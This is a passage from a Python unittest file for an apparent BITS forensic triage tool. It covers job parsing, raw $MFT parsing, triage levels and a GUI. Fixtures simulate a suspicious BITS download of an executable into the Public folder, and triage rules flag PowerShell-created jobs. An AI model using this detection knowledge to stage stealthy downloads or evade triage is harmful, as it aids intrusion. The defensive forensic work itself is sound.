
    def test_windows_paths_parsed_on_any_os(self):
        """Regression (Linux CI): creator basename must split on '\\' everywhere."""
        j, _ = P.parse_job(job_blob(creator="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                    cmd="", errors=0, state=6, name="x"))
        self.assertIn("MED: job created by powershell.exe (scripted/manual BITS use)", P.triage(j, []))


def synthetic_mft(rec_size=1024):
    """root(5) > Windows(6) > System32(7); WinSxS(8); Users(9) > Public(10)
    11 mail.exe DELETED, 12 bitsadmin.exe hard-linked System32+WinSxS, 14 base + 15 extension
    record holding ext.dll's $FN/$DATA, 16 a long name that crosses the 510 fix-up slot,
    17 a file whose parent folder slot was reused (sequence mismatch)."""
    long_name = "x" * 60 + ".exe"
    r = {
        5: mft_record(5, [(3, ".", 5, 5)], is_dir=True, seq=5, rec_size=rec_size),
        6: mft_record(6, [(1, "Windows", 5, 5)], is_dir=True, rec_size=rec_size),
        7: mft_record(7, [(1, "System32", 6, 1)], is_dir=True, rec_size=rec_size),
        8: mft_record(8, [(1, "WinSxS", 6, 1)], is_dir=True, rec_size=rec_size),
        9: mft_record(9, [(1, "Users", 5, 5)], is_dir=True, rec_size=rec_size),
        10: mft_record(10, [(1, "Public", 9, 1)], is_dir=True, rec_size=rec_size),
        11: mft_record(11, [(2, "MAIL~1.EXE", 10, 1), (1, "mail.exe", 10, 1)], days=3, size=10,
                       in_use=False, rec_size=rec_size),
        12: mft_record(12, [(1, "bitsadmin.exe", 8, 1), (1, "bitsadmin.exe", 7, 1)], days=1, size=227840,
                       nonres_data=True, rec_size=rec_size),
        14: mft_record(14, [], days=2, attr_list=((0x10, 14), (0x30, 15), (0x80, 15)), rec_size=rec_size),
        15: mft_record(15, [(1, "ext.dll", 7, 1)], size=4096, nonres_data=True, base=14, rec_size=rec_size),
        16: mft_record(16, [(1, long_name, 10, 1)], days=4, size=1, rec_size=rec_size,
                       pad_before_fn=80),             # shifts the long name across byte 510
        17: mft_record(17, [(1, "orphan.tmp", 10, 9)], days=5, size=3, rec_size=rec_size),
    }
    return mft_image(r, count=20, rec_size=rec_size), long_name


class TestRawMft(unittest.TestCase):
    def _mft(self, d, rec_size=1024):
        img, long_name = synthetic_mft(rec_size)
        p = os.path.join(d, "$MFT")
        with open(p, "wb") as fh:
            fh.write(img)
        return p, long_name

    def test_paths_hardlinks_extension_deleted_fixup(self):
        for rs in (1024, 4096):
            with tempfile.TemporaryDirectory() as d:
                p, long_name = self._mft(d, rs)
                with P.RawMft(p) as m:
                    self.assertEqual((m.rec_size, m.count), (rs, 20))
                    hits = {r["entry"]: r for r in m.scan_names(
                        {"mail.exe", "bitsadmin.exe", "ext.dll", long_name.lower(), "orphan.tmp"})}
                    self.assertEqual(set(hits), {11, 12, 14, 16, 17}, rs)
                    self.assertEqual(m.paths_of(hits[11]), [("C:\\Users\\Public\\mail.exe", True)])
                    self.assertFalse(hits[11]["in_use"])
                    self.assertEqual(sorted(p for p, _ in m.paths_of(hits[12])),
                                     ["C:\\Windows\\System32\\bitsadmin.exe", "C:\\Windows\\WinSxS\\bitsadmin.exe"])
                    self.assertEqual(hits[12]["size"], 227840)
                    self.assertEqual(hits[14]["size"], 4096)                       # from extension record
                    self.assertTrue(P.filetime(hits[14]["si"][0]).startswith("2026-01-03"))
                    self.assertEqual(m.paths_of(hits[14])[0][0], "C:\\Windows\\System32\\ext.dll")
                    self.assertEqual(m.paths_of(hits[16])[0][0], "C:\\Users\\Public\\" + long_name)
                    self.assertEqual(m.paths_of(hits[17]), [("C:\\Users\\Public\\orphan.tmp", False)])

    def test_long_name_really_crosses_fixup_slot(self):
        img, long_name = synthetic_mft()
        rec = img[16 * 1024:17 * 1024]
        enc = long_name.encode("utf-16-le")
        self.assertNotIn(enc, rec)                                  # garbled on disk by the USN...
        with tempfile.TemporaryDirectory() as d:
            p, _ = self._mft(d)
            with P.RawMft(p) as m:
                self.assertIn(long_name, [nm for ns, nm, *_ in m.record(16)["names"]])   # ...restored by fix-ups

    def test_correlate_and_triage(self):
        with tempfile.TemporaryDirectory() as d:
            p, _ = self._mft(d)
            j, _ = P.parse_job(job_blob())
            j["files"] = [{"source_url": "http://127.0.0.1/a.exe", "dest_file": "C:\\Users\\Public\\mail.exe",
                           "tmp_file": "C:\\Users\\Public\\nothere.tmp"}]
            n, stats = P.correlate_raw_mft([j], p)
        self.assertEqual((n, stats["records"]), (1, 20))
        m = j["files"][0]["mft"][0]
        self.assertEqual((m["entry"], m["in_use"], m["size"]), (11, False, 10))
        self.assertTrue(m["created"].startswith("2026-01-04"))
        self.assertTrue(any("DELETED" in t for t in j["triage"]))

    def test_analyse_routes_mft_and_never_carves_it(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False)
            img, _ = synthetic_mft()
            with open(os.path.join(d, "$MFT"), "wb") as fh:          # embed a job blob: must NOT be carved
                fh.write(img + job_blob(name="inside-mft"))
            r = P.analyse(d)
        self.assertTrue(any(n.startswith("raw $MFT") for n in r["parse_notes"]), r["parse_notes"])
        self.assertNotIn("inside-mft", {j["name"] for j in r["jobs"]})

    def test_garbage_and_empty_mft(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "$MFT")
            with open(p, "wb") as fh:
                fh.write(os.urandom(1024 * 30))
            with P.RawMft(p) as m:
                self.assertEqual(m.scan_names({"a.exe"}), [])
                self.assertIsNone(m.record(3))
            j, _ = P.parse_job(job_blob())
            self.assertEqual(P.correlate_raw_mft([j], p)[0], 0)


class TestDemoData(unittest.TestCase):
    def test_demo_folder_levels_and_links(self):
        import make_demo_data
        with tempfile.TemporaryDirectory() as d:
            r = P.analyse(make_demo_data.build(d))
        lv = {j["name"]: j["level"] for j in r["latest"]}
        self.assertEqual(lv, {"Edge Component Updater": "INFO", "System update": "HIGH",
                              "sync": "MED", "DirectX_Database_Download_AsUser_1.9.3": "REVIEW"})
        self.assertTrue(all(j["files"] for j in r["latest"]))          # file GUID linking works
        self.assertIn("edb00042.log", {e["name"] for e in r["i30"] if e["in_slack"]})


# ------------------------------------------------------------------ real data / this PC
@unittest.skipUnless(HAVE_EVIDENCE, "set BITS_EVIDENCE to an exported Downloader folder")
class TestRealEvidence(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.before = {n: P.sha256(os.path.join(EVIDENCE, n)) for n in os.listdir(EVIDENCE)
                      if os.path.isfile(os.path.join(EVIDENCE, n))}
        cls.r = P.analyse(EVIDENCE)

    # generic invariants - hold for any real export
    def test_evidence_unchanged(self):
        after = {n: P.sha256(os.path.join(EVIDENCE, n)) for n in self.before}
        self.assertEqual(self.before, after)

    def test_ese_read_cleanly_and_active_jobs_complete(self):
        self.assertFalse([n for n in self.r["parse_notes"] if "ESE read" in n], self.r["parse_notes"])
        for j in self.r["jobs"]:
            if j["status"] == "active":
                self.assertTrue(j["files"], j["job_id"])
                self.assertTrue(j.get("tail_complete"), j["job_id"])

    def test_all_records_have_valid_times_and_sids(self):
        for j in self.r["jobs"]:
            self.assertEqual(set(P.JOB_SCHEMA) - set(j), set(), j["source"])   # uniform schema
            if j["status"] == "event log only":
                continue        # no DB record: owner SID unknown, created only if EID 3 survived
            self.assertTrue(j["created"], j["source"])
            self.assertRegex(j["owner_sid"], r"^S-1-\d+(-\d+)+$")
            self.assertIn(j["state"], P.JOB_STATE.values())

    def test_review_items_are_system32_notify(self):
        for j in self.r["latest"]:
            if j["level"] == "REVIEW":
                self.assertRegex(j["notify_cmd"], r"(?i)^[a-z]:\\windows\\system32\\")

    def test_fileslack_not_treated_as_bits(self):
        self.assertTrue(all("FileSlack" not in s for j in self.r["jobs"] for s in j["source"]))

    def test_i30_lists_queue_files(self):
        if self.r["i30"]:
            self.assertIn("qmgr.db", {e["name"] for e in self.r["i30"]})

    def test_security_descriptor_owner_matches_job_owner(self):
        withsd = [j for j in self.r["jobs"] if j.get("sd_owner_sid")]
        self.assertGreater(len(withsd), 0.9 * len(self.r["jobs"]))
        self.assertEqual([j["job_id"] for j in withsd if j["sd_owner_sid"] != j["owner_sid"]], [])

    # exact values - only when local_expectations.json describes this export
    def test_exact_expectations(self):
        if not EXPECT:
            self.skipTest("no local_expectations.json")
        if "qmgr_sha256" in EXPECT:
            self.assertEqual(self.before.get("qmgr.db"), EXPECT["qmgr_sha256"])
        if "active_job_ids" in EXPECT:
            self.assertEqual({j["job_id"] for j in self.r["jobs"] if j["status"] == "active"},
                             set(EXPECT["active_job_ids"]))
        for k in EXPECT.get("known_files", []):
            j = [j for j in self.r["latest"] if j["job_id"] == k["job_id"]][0]
            f = j["files"][0]
            self.assertEqual((f["download_size"], f["transfer_size"]),
                             (k["download_size"], k["transfer_size"]))
            self.assertEqual(j["created"], k["created"])
        db = [j for j in self.r["latest"] if j["status"] != "event log only"]
        if "allowed_levels" in EXPECT:          # applies to database/carved records
            self.assertTrue({j["level"] for j in db} <= set(EXPECT["allowed_levels"]),
                            {j["name"]: j["level"] for j in db if j["level"] not in EXPECT["allowed_levels"]})
        if "event_only_high" in EXPECT:         # exactly these event-log-only jobs are HIGH
            self.assertEqual(sorted(j["name"] for j in self.r["latest"]
                                    if j["status"] == "event log only" and j["level"] == "HIGH"),
                             sorted(EXPECT["event_only_high"]))
        if "commands" in EXPECT:
            self.assertEqual(len(self.r["commands"]), EXPECT["commands"])
            self.assertTrue(all(c["level"] == "INFO" for c in self.r["commands"]))
        if "i30_names" in EXPECT:               # Downloader index entries must be present
            missing = set(EXPECT["i30_names"]) - {e["name"] for e in self.r["i30"]}
            self.assertEqual(missing, set())


def _live_events_available():
    try:
        return bool(P.read_events())
    except Exception:
        return False


@unittest.skipUnless(HAVE_EVIDENCE and EXPECT.get("from_this_pc") and os.name == "nt"
                     and _live_events_available(), "needs evidence exported from this PC + its event log")
class TestGroundTruthThisPC(unittest.TestCase):
    """The evidence was exported from this PC, so its live log/API are ground truth."""
    @classmethod
    def setUpClass(cls):
        cls.ev = P.read_events()
        cls.r = P.analyse(EVIDENCE, events=cls.ev)

    def test_creator_process_inferred_matches_event_3(self):
        both = [j for j in self.r["jobs"] if j.get("creator_process_inferred") and j.get("creator_process_evt")]
        self.assertGreater(len(both), 50)
        bad = [j for j in both if j["creator_process_inferred"].lower() != j["creator_process_evt"].lower()]
        self.assertEqual(bad, [])

    def test_sizes_and_urls_match_get_bitstransfer(self):
        live = {j["job_id"].lower(): j for j in P.live_jobs()}
        checked = 0
        for j in self.r["jobs"]:
            if j["status"] == "active" and j["job_id"] in live:
                f, lf = j["files"][0], live[j["job_id"]]["files"][0]
                self.assertEqual((f["download_size"], f["transfer_size"], f["source_url"]),
                                 (lf["download_size"], lf["transfer_size"], lf["source_url"]))
                checked += 1
        if not checked:
            self.skipTest("active jobs no longer live")

    def test_raw_mft_matches_live_disk(self):
        """Raw $MFT parser vs os.stat on ~50 files that exist now (System32 incl. hard links)."""
        import datetime as _dt
        import random as _r
        mft = os.path.join(EVIDENCE, "$MFT")
        if not os.path.exists(mft):
            self.skipTest("no raw $MFT in the evidence folder")
        s32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
        pool = sorted(os.path.join(s32, f) for f in os.listdir(s32) if os.path.isfile(os.path.join(s32, f)))
        targets = [os.path.join(s32, "bitsadmin.exe"), os.path.join(s32, "cmd.exe")] + \
            _r.Random(7).sample(pool, 48)
        got = {}
        with P.RawMft(mft) as m:
            for rec in m.scan_names({os.path.basename(t).lower() for t in targets}):
                for p, _ok in m.paths_of(rec):
                    got.setdefault(p.lower(), rec)
        ok = 0
        for t in targets:
            rec, st = got.get(t.lower()), os.stat(t)
            birth = _dt.datetime.fromtimestamp(getattr(st, "st_birthtime", st.st_ctime),
                                               _dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
            ok += bool(rec and rec["in_use"] and rec["size"] == st.st_size and rec["si"]
                       and P.filetime(rec["si"][0])[:19] == birth)
        # the snapshot can legitimately differ for files Windows servicing replaced since capture
        self.assertGreaterEqual(ok, 0.9 * len(targets), "%d/%d matched" % (ok, len(targets)))

    def test_evtx_file_equals_live_log(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "bits.evtx")
            subprocess.run(["wevtutil", "epl", "Microsoft-Windows-Bits-Client/Operational", p],
                           check=True, capture_output=True)
            ev = P.read_events(path=p)
            self.assertGreater(len(ev), 0)
            live_rec = {e["record"] for e in P.read_events()}
            self.assertTrue({e["record"] for e in ev} <= live_rec | {max(live_rec) + i for i in range(1, 50)})
            r = P.analyse(d)                                  # evtx found inside a folder
            self.assertEqual(r["summary"]["events"], len(ev))
            self.assertTrue(all(e["source"] == "evtx:bits.evtx" for e in r["events"]))


# ------------------------------------------------------------------ GUI
class TestGUI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        try:
            import tkinter
            tkinter.Tk().destroy()
        except Exception as e:
            raise unittest.SkipTest("no display: %s" % e)
        import bits_gui
        cls.G = bits_gui

    def test_gui_end_to_end(self):
        G = self.G
        with tempfile.TemporaryDirectory() as d, mock.patch.object(G, "save_prefs") as sp:
            make_folder(d)
            app = G.App(d, "light")
            app.withdraw()
            try:
                app.result = P.analyse(d, events=P.read_events(raw_json=EVT_JSON))
                app._fill_static()
                with mock.patch.object(P, "_ps", side_effect=[LIVE_JSON, EVT_JSON]):
                    app.live, app.live_events = P.live_snapshot()
                app._fill_events(); app.refresh(); app.update()
                n_all = len(app.jobs_tv.get_children())
                self.assertGreaterEqual(n_all, 4)
                first = app.rows[app.jobs_tv.get_children()[0]]
                self.assertEqual(first["level"], "HIGH")                # severity sorted first
                app._show_detail()
                self.assertIn("HIGH", app.detail.get("1.0", "end"))
                for lvl in ("Flagged (H/M/R)", "HIGH", "MED", "REVIEW", "INFO", "All"):
                    app.level.set(lvl); app.refresh()
                    for iid in app.jobs_tv.get_children():
                        lv = app.rows[iid]["level"]
                        if lvl in ("HIGH", "MED", "REVIEW", "INFO"):
                            self.assertEqual(lv, lvl)
                for stf in G.STATUSES:
                    app.status_f.set(stf); app.refresh()
                app.status_f.set("All")
                app.search.set("evil"); app.refresh()
                self.assertTrue(all("evil" in json.dumps(app.rows[i], default=str).lower()
                                    for i in app.jobs_tv.get_children()))
                app.search.set(""); app.hide_noise.set(True); app.refresh()
                self.assertTrue(all(app.rows[i]["level"] != "INFO" for i in app.jobs_tv.get_children()))
                self.assertGreater(len(app.ev_tv.get_children()), 0)
                app.ev_tv.selection_set(app.ev_tv.get_children()[0]); app._show_event()
                self.assertTrue(app.detail.get("1.0", "end").strip())
                for th in ("dark", "light", "dark"):
                    app.apply_theme(th); app.update()
                    self.assertEqual(str(app.detail.cget("bg")), G.THEMES[th]["panel"])
                app.toggle_theme()
                self.assertEqual(app.theme, "light"); sp.assert_called()
                app._sort(app.jobs_tv, "created", False); app._sort(app.jobs_tv, "events", True)
                out = os.path.join(d, "exp")
                with mock.patch.object(G.filedialog, "askdirectory", return_value=out):
                    os.makedirs(out); app.export()
                self.assertTrue(os.path.exists(os.path.join(out, "bits_live_snapshot.json")))
                self.assertTrue(os.path.exists(os.path.join(out, "bits_events.csv")))
            finally:
                app.destroy()


if __name__ == "__main__":
    unittest.main()
